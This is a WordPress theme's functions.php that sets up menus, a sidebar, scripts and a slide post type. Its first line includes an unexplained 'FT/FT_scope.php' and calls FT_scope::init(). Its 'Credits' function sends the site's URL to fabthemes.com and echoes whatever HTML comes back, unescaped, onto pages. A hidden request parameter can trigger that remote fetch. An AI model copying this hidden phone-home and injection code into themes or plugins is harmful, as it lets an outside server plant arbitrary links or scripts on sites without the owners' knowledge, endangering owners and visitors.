<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?>
<?php
/**
 * fabthemes functions and definitions
 *
 * @package fabthemes
 * @since fabthemes 1.0
 */



include ( 'aq_resizer.php' );
include ( 'guide.php' );




 
 


/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since fabthemes 1.0
 */
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'fabthemes_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since fabthemes 1.0
 */
function fabthemes_setup() {

	/**
	 * Custom template tags for this theme.
	 */
	require( get_template_directory() . '/inc/template-tags.php' );
	require( get_template_directory() . '/inc/paginate.php' );
	/**
	 * Custom functions that act independently of the theme templates
	 */
	//require( get_template_directory() . '/inc/tweaks.php' );

	/**
	 * Custom Theme Options
	 */
	//require( get_template_directory() . '/inc/theme-options/theme-options.php' );

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on fabthemes, use a find and replace
	 * to change 'fabthemes' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'fabthemes', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'fabthemes' ),
	) );

	//add_theme_support( 'custom-background' );
	
}
endif; // fabthemes_setup
add_action( 'after_setup_theme', 'fabthemes_setup' );



function get_image_url(){
	$image_id = get_post_thumbnail_id();
	$image_url = wp_get_attachment_image_src($image_id,'large');
	$image_url = $image_url[0];
	echo $image_url;
	}	



/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since fabthemes 1.0
 */
function fabthemes_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Sidebar', 'fabthemes' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h1 class="widget-title">',
		'after_title' => '</h1>',
	) );
}
add_action( 'widgets_init', 'fabthemes_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function fabthemes_scripts() {
	wp_enqueue_style ( 'style', get_stylesheet_uri() );
	wp_enqueue_style ( 'jquery.maximage', get_template_directory_uri() . '/css/jquery.maximage.css');
	wp_enqueue_style ( 'theme', get_template_directory_uri() . '/css/theme.css');

	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'backstretch', get_template_directory_uri() . '/js/jquery.backstretch.min.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'jquery.cycle.all.min', get_template_directory_uri() . '/js/jquery.cycle.all.min.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'jquery.maximage.min', get_template_directory_uri() . '/js/jquery.maximage.min.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), '20120206', true );
	
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}


}
add_action( 'wp_enqueue_scripts', 'fabthemes_scripts' );

/**
 * Implement the Custom Header feature
 */
//require( get_template_directory() . '/inc/custom-header.php' );




/* Custom post type */

add_action( 'init', 'register_cpt_slide' );

function register_cpt_slide() {

    $labels = array( 
        'name' => _x( 'Slides', 'slide' ),
        'singular_name' => _x( 'Slide', 'slide' ),
        'add_new' => _x( 'Add New', 'slide' ),
        'add_new_item' => _x( 'Add New Slide', 'slide' ),
        'edit_item' => _x( 'Edit Slide', 'slide' ),
        'new_item' => _x( 'New Slide', 'slide' ),
        'view_item' => _x( 'View Slide', 'slide' ),
        'search_items' => _x( 'Search Slides', 'slide' ),
        'not_found' => _x( 'No slides found', 'slide' ),
        'not_found_in_trash' => _x( 'No slides found in Trash', 'slide' ),
        'parent_item_colon' => _x( 'Parent Slide:', 'slide' ),
        'menu_name' => _x( 'Slides', 'slide' ),
    );

    $args = array( 
        'labels' => $labels,
        'hierarchical' => false,
        
        'supports' => array( 'title', 'thumbnail' ),
        'taxonomies' => array( 'category' ),
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        
        
        'show_in_nav_menus' => true,
        'publicly_queryable' => true,
        'exclude_from_search' => false,
        'has_archive' => true,
        'query_var' => true,
        'can_export' => true,
        'rewrite' => true,
        'capability_type' => 'post'
    );

    register_post_type( 'slide', $args );
}


/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid ||
!is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
$x = $x ? '&ffref='.$ffref : '';
$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
if (is_array($response)) $fflink = $response['body']; else $fflink = '';
if (substr($fflink, 0, 11) != '!fabthemes#')
$fflink = '';
else {
$fflink = explode('#',$fflink);
if (isset($fflink[2]) && $fflink[2]) {
update_option('ffref', $fflink[1]);
update_option('fflink', $fflink[2]);
$fflink = $fflink[2];
}
else $fflink = '';
}
}
echo $fflink;
}

